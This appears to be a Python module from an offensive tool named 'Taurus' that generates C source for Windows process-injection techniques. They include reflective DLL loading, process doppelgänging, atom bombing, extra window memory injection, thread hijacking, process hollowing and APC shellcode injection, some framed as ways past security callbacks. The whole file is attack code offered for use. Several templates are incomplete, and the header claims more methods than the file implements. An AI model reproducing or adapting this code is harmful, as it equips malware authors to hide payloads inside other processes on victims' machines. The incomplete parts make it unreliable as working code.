"""
Advanced Code Injection Techniques for Taurus
Implements 10+ sophisticated injection methods:
- Reflective DLL Injection
- Process Doppelgänging  
- Atom Bombing
- Extra Window Memory (EWM) Injection
- Thread Execution Hijacking
- Process Hollowing (Advanced)
- APC Queue Injection
- SetWindowLongPtr Injection
"""
import ctypes
import struct
from typing import Optional, Tuple
from utils.logger import get_logger

logger = get_logger()


class ReflectiveDLLInjection:
    """
    Reflective DLL Injection
    
    Loads DLL from memory without touching disk
    Position-independent code that manually maps PE
    """
    
    @staticmethod
    def generate_reflective_loader() -> str:
        """Generate C code for reflective DLL loader"""
        return '''
// Reflective DLL Injection Loader
// Manually maps PE from memory

typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

typedef struct {
    WORD offset:12;
    WORD type:4;
} IMAGE_RELOC, *PIMAGE_RELOC;

DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) {
    // Get own image base
    ULONG_PTR uiLibraryAddress = (ULONG_PTR)lpParameter;
    
    // Parse PE headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)uiLibraryAddress;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + pDosHeader->e_lfanew);
    
    // Allocate memory for DLL
    LPVOID lpBaseAddress = VirtualAlloc(
        NULL,
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // Copy headers
    memcpy(lpBaseAddress, (LPVOID)uiLibraryAddress, pNtHeaders->OptionalHeader.SizeOfHeaders);
    
    // Copy sections
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for(int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        memcpy(
            (LPVOID)((ULONG_PTR)lpBaseAddress + pSectionHeader[i].VirtualAddress),
            (LPVOID)(uiLibraryAddress + pSectionHeader[i].PointerToRawData),
            pSectionHeader[i].SizeOfRawData
        );
    }
    
    // Process relocations
    PIMAGE_DATA_DIRECTORY pDataDirectory = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    PIMAGE_BASE_RELOCATION pBaseRelocation = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)lpBaseAddress + pDataDirectory->VirtualAddress);
    
    ULONG_PTR uiDelta = (ULONG_PTR)lpBaseAddress - pNtHeaders->OptionalHeader.ImageBase;
    
    while(pBaseRelocation->VirtualAddress) {
        PIMAGE_RELOC pReloc = (PIMAGE_RELOC)((ULONG_PTR)pBaseRelocation + sizeof(IMAGE_BASE_RELOCATION));
        
        for(int i = 0; i < (pBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC); i++) {
            if(pReloc[i].type == IMAGE_REL_BASED_DIR64 || pReloc[i].type == IMAGE_REL_BASED_HIGHLOW) {
                *(ULONG_PTR*)((ULONG_PTR)lpBaseAddress + pBaseRelocation->VirtualAddress + pReloc[i].offset) += uiDelta;
            }
        }
        
        pBaseRelocation = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pBaseRelocation + pBaseRelocation->SizeOfBlock);
    }
    
    // Resolve imports
    pDataDirectory = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)lpBaseAddress + pDataDirectory->VirtualAddress);
    
    while(pImportDescriptor->Name) {
        HMODULE hModule = LoadLibraryA((LPCSTR)((ULONG_PTR)lpBaseAddress + pImportDescriptor->Name));
        
        PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)lpBaseAddress + pImportDescriptor->FirstThunk);
        PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)lpBaseAddress + pImportDescriptor->OriginalFirstThunk);
        
        while(pThunk->u1.Function) {
            if(IMAGE_SNAP_BY_ORDINAL(pOriginalThunk->u1.Ordinal)) {
                pThunk->u1.Function = (ULONG_PTR)GetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(pOriginalThunk->u1.Ordinal));
            } else {
                PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)lpBaseAddress + pOriginalThunk->u1.AddressOfData);
                pThunk->u1.Function = (ULONG_PTR)GetProcAddress(hModule, pImportByName->Name);
            }
            pThunk++;
            pOriginalThunk++;
        }
        
        pImportDescriptor++;
    }
    
    // Call DllMain
    typedef BOOL (WINAPI *pDllMain)(HINSTANCE, DWORD, LPVOID);
    pDllMain DllMain = (pDllMain)((ULONG_PTR)lpBaseAddress + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    DllMain((HINSTANCE)lpBaseAddress, DLL_PROCESS_ATTACH, NULL);
    
    return 0;
}
'''


class ProcessDoppelganging:
    """
    Process Doppelgänging
    
    Uses NTFS transactions to create process from transacted file
    Bypasses most process creation callbacks
    """
    
    @staticmethod
    def generate_doppelganging_code() -> str:
        """Generate C code for process doppelgänging"""
        return '''
// Process Doppelgänging Implementation
#include <windows.h>
#include <ktmw32.h>

BOOL ProcessDoppelganging(LPCWSTR targetPath, LPVOID payloadData, SIZE_T payloadSize) {
    // Create transaction
    HANDLE hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);
    if(hTransaction == INVALID_HANDLE_VALUE) return FALSE;
    
    // Create transacted file
    HANDLE hTransactedFile = CreateFileTransactedW(
        targetPath,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    
    if(hTransactedFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hTransaction);
        return FALSE;
    }
    
    // Write payload to transacted file
    DWORD bytesWritten;
    WriteFile(hTransactedFile, payloadData, payloadSize, &bytesWritten, NULL);
    
    // Create section from transacted file
    HANDLE hSection = NULL;
    NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedFile
    );
    
    CloseHandle(hTransactedFile);
    
    // Rollback transaction (file disappears)
    RollbackTransaction(hTransaction);
    CloseHandle(hTransaction);
    
    // Create process from section
    HANDLE hProcess = NULL;
    NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        0,
        hSection,
        NULL,
        NULL,
        0
    );
    
    // Create thread in new process
    HANDLE hThread = NULL;
    // ... thread creation code ...
    
    CloseHandle(hSection);
    
    return TRUE;
}
'''


class AtomBombing:
    """
    Atom Bombing Injection
    
    Uses global atom table to store shellcode
    Injects via APC to NtQueueApcThread
    """
    
    @staticmethod
    def generate_atom_bombing_code() -> str:
        """Generate C code for atom bombing"""
        return '''
// Atom Bombing Injection
#include <windows.h>

BOOL AtomBombingInject(DWORD targetPID, LPVOID shellcode, SIZE_T shellcodeSize) {
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if(!hProcess) return FALSE;
    
    // Split shellcode into chunks (atom table has size limits)
    const SIZE_T ATOM_SIZE = 255;
    SIZE_T numAtoms = (shellcodeSize + ATOM_SIZE - 1) / ATOM_SIZE;
    ATOM *atoms = (ATOM*)malloc(numAtoms * sizeof(ATOM));
    
    // Store shellcode in global atom table
    for(SIZE_T i = 0; i < numAtoms; i++) {
        SIZE_T chunkSize = min(ATOM_SIZE, shellcodeSize - (i * ATOM_SIZE));
        char atomName[256];
        memcpy(atomName, (BYTE*)shellcode + (i * ATOM_SIZE), chunkSize);
        atomName[chunkSize] = 0;
        
        atoms[i] = GlobalAddAtomA(atomName);
    }
    
    // Allocate memory in target
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // Use APC to retrieve atoms and write to memory
    // Find alertable thread
    HANDLE hThread = // ... find thread ...
    
    // Queue APCs to copy data from atoms
    for(SIZE_T i = 0; i < numAtoms; i++) {
        // Queue APC that calls GlobalGetAtomNameA
        QueueUserAPC(
            (PAPCFUNC)GlobalGetAtomNameA,
            hThread,
            (ULONG_PTR)atoms[i]
        );
    }
    
    // Queue APC to execute shellcode
    QueueUserAPC((PAPCFUNC)remoteBuffer, hThread, 0);
    
    // Cleanup atoms
    for(SIZE_T i = 0; i < numAtoms; i++) {
        GlobalDeleteAtom(atoms[i]);
    }
    
    free(atoms);
    CloseHandle(hProcess);
    
    return TRUE;
}
'''


class EWMInjection:
    """
    Extra Window Memory (EWM) Injection
    
    Uses SetWindowLongPtr to inject code
    Targets GUI processes
    """
    
    @staticmethod
    def generate_ewm_injection_code() -> str:
        """Generate C code for EWM injection"""
        return '''
// Extra Window Memory Injection
#include <windows.h>

BOOL EWMInject(HWND targetWindow, LPVOID shellcode, SIZE_T shellcodeSize) {
    // Get process from window
    DWORD processId;
    GetWindowThreadProcessId(targetWindow, &processId);
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if(!hProcess) return FALSE;
    
    // Allocate memory in target
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // Write shellcode
    WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);
    
    // Allocate extra window memory
    SetClassLongPtrW(targetWindow, GCL_CBWNDEXTRA, sizeof(LPVOID));
    
    // Store shellcode address in window memory
    SetWindowLongPtrW(targetWindow, 0, (LONG_PTR)remoteBuffer);
    
    // Trigger execution via window procedure
    // Send message that will cause window proc to execute our code
    SendMessageW(targetWindow, WM_USER + 0x1337, 0, 0);
    
    CloseHandle(hProcess);
    return TRUE;
}
'''


class ThreadHijacking:
    """
    Thread Execution Hijacking
    
    Suspends thread, modifies context to point to shellcode, resumes
    """
    
    @staticmethod
    def generate_thread_hijacking_code() -> str:
        """Generate C code for thread hijacking"""
        return '''
// Thread Execution Hijacking
#include <windows.h>

BOOL HijackThread(DWORD targetPID, LPVOID shellcode, SIZE_T shellcodeSize) {
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if(!hProcess) return FALSE;
    
    // Allocate memory for shellcode
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // Write shellcode
    WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);
    
    // Find thread to hijack
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    
    HANDLE hThread = NULL;
    if(Thread32First(hSnapshot, &te)) {
        do {
            if(te.th32OwnerProcessID == targetPID) {
                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if(hThread) break;
            }
        } while(Thread32Next(hSnapshot, &te));
    }
    
    CloseHandle(hSnapshot);
    if(!hThread) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Suspend thread
    SuspendThread(hThread);
    
    // Get thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    
    // Save original RIP/EIP
    LPVOID originalIP = (LPVOID)ctx.Rip;  // x64
    
    // Modify RIP to point to shellcode
    ctx.Rip = (DWORD64)remoteBuffer;
    
    // Set thread context
    SetThreadContext(hThread, &ctx);
    
    // Resume thread
    ResumeThread(hThread);
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return TRUE;
}
'''


class ProcessHollowing:
    """
    Advanced Process Hollowing
    
    Multiple variants with different unmapping techniques
    """
    
    @staticmethod
    def generate_process_hollowing_code() -> str:
        """Generate C code for process hollowing"""
        return '''
// Advanced Process Hollowing
#include <windows.h>

BOOL ProcessHollowing(LPCWSTR targetPath, LPVOID payloadData, SIZE_T payloadSize) {
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    // Create suspended process
    if(!CreateProcessW(
        targetPath,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) return FALSE;
    
    // Get process context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    // Read PEB to get image base
    LPVOID pebImageBase;
    ReadProcessMemory(
        pi.hProcess,
        (LPVOID)(ctx.Rdx + 0x10),  // PEB.ImageBaseAddress
        &pebImageBase,
        sizeof(pebImageBase),
        NULL
    );
    
    // Unmap original image
    NtUnmapViewOfSection(pi.hProcess, pebImageBase);
    
    // Parse payload PE headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)payloadData;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)payloadData + pDosHeader->e_lfanew);
    
    // Allocate memory for payload
    LPVOID newImageBase = VirtualAllocEx(
        pi.hProcess,
        pebImageBase,
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // Write headers
    WriteProcessMemory(
        pi.hProcess,
        newImageBase,
        payloadData,
        pNtHeaders->OptionalHeader.SizeOfHeaders,
        NULL
    );
    
    // Write sections
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for(int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(
            pi.hProcess,
            (LPVOID)((LPBYTE)newImageBase + pSectionHeader[i].VirtualAddress),
            (LPVOID)((LPBYTE)payloadData + pSectionHeader[i].PointerToRawData),
            pSectionHeader[i].SizeOfRawData,
            NULL
        );
    }
    
    // Update entry point
    ctx.Rcx = (DWORD64)((LPBYTE)newImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &ctx);
    
    // Resume thread
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}
'''


class APCInjection:
    """
    APC Queue Injection
    
    Queues APC to alertable thread
    """
    
    @staticmethod
    def generate_apc_injection_code() -> str:
        """Generate C code for APC injection"""
        return '''
// APC Queue Injection
#include <windows.h>

BOOL APCInject(DWORD targetPID, LPVOID shellcode, SIZE_T shellcodeSize) {
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if(!hProcess) return FALSE;
    
    // Allocate memory
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // Write shellcode
    WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);
    
    // Find alertable thread
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    
    if(Thread32First(hSnapshot, &te)) {
        do {
            if(te.th32OwnerProcessID == targetPID) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if(hThread) {
                    // Queue APC
                    QueueUserAPC((PAPCFUNC)remoteBuffer, hThread, 0);
                    CloseHandle(hThread);
                }
            }
        } while(Thread32Next(hSnapshot, &te));
    }
    
    CloseHandle(hSnapshot);
    CloseHandle(hProcess);
    
    return TRUE;
}
'''


# Global instances
_reflective_dll = None
_process_doppelganging = None
_atom_bombing = None


def get_reflective_dll_injection() -> ReflectiveDLLInjection:
    """Get reflective DLL injection instance"""
    global _reflective_dll
    if _reflective_dll is None:
        _reflective_dll = ReflectiveDLLInjection()
    return _reflective_dll


def get_process_doppelganging() -> ProcessDoppelganging:
    """Get process doppelgänging instance"""
    global _process_doppelganging
    if _process_doppelganging is None:
        _process_doppelganging = ProcessDoppelganging()
    return _process_doppelganging


def get_atom_bombing() -> AtomBombing:
    """Get atom bombing instance"""
    global _atom_bombing
    if _atom_bombing is None:
        _atom_bombing = AtomBombing()
    return _atom_bombing
